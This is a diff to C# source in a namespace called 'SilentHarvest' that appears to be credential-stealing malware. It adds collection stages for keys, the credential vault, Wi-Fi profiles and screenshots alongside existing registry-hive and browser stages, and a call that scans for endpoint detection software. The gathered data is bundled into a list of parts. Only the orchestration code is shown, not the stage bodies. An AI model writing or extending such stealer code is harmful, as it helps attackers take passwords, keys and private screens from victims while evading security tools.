@@ -62,6 +62,10 @@ namespace SilentHarvest
             bool wantReg = only == null || only.Contains("reg");
             bool wantHives = only == null || only.Contains("hive");
             bool wantBrowsers = only == null || only.Contains("brow");
+            bool wantKeys = only == null || only.Contains("key");
+            bool wantVault = only == null || only.Contains("vault");
+            bool wantWifi = only == null || only.Contains("wifi");
+            bool wantShot = only == null || only.Contains("shot");
 
             if (wantReg)
             {
@@ -82,6 +86,31 @@ namespace SilentHarvest
                 string s = Stages.BrowserStage(parts);
                 Util.Log("browser stage: {0}", s);
             }
+            if (wantKeys)
+            {
+                string s = Stages.KeysStage(parts);
+                Util.Log("keys stage: {0}", s);
+            }
+            if (wantVault)
+            {
+                string s = Stages.VaultStage(parts);
+                Util.Log("vault stage: {0}", s);
+            }
+            if (wantWifi)
+            {
+                string s = Stages.WifiStage(parts, elevated);
+                Util.Log("wifi stage: {0}", s);
+            }
+            if (wantShot)
+            {
+                byte[] png = Stages.ScreenshotPng();
+                if (png != null)
+                {
+                    parts.Add(new Part("win:screenshot.png", png, null));
+                    Util.Log("screenshot: {0} bytes", png.Length);
+                }
+            }
+            Stages.EdrScan(parts);
 
             if (parts.Count <= 1)
             {
